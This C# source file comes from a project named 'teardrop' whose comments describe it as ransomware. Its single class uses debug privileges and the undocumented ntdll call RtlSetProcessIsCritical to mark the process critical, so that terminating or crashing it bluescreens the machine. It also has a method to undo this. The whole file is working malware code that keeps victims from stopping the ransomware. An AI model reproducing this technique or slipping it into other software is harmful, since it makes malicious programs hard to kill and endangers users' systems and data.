using System.Diagnostics;
using System.Runtime.InteropServices;

namespace teardrop
{
    // The folllowing class is used to make the process "unkillable".
    // By calling "Make.ProcessUnkillable();" the process enters a debug mode
    // and sets itself to a critical process. This means when the ransomware is
    // terminated or crashes, it will cause a bluescreen.
    public partial class ProcessMananger
    {
        [LibraryImport("ntdll.dll", SetLastError = true)]
        private static partial void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        // Enabled the "unkillable" feature
        public static void ProcessUnkillable()      
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        // Disables the "unkillable" feature
        public static void ProcessKillable()        
        {
            RtlSetProcessIsCritical(0, 0, 0);
        }
    }
}
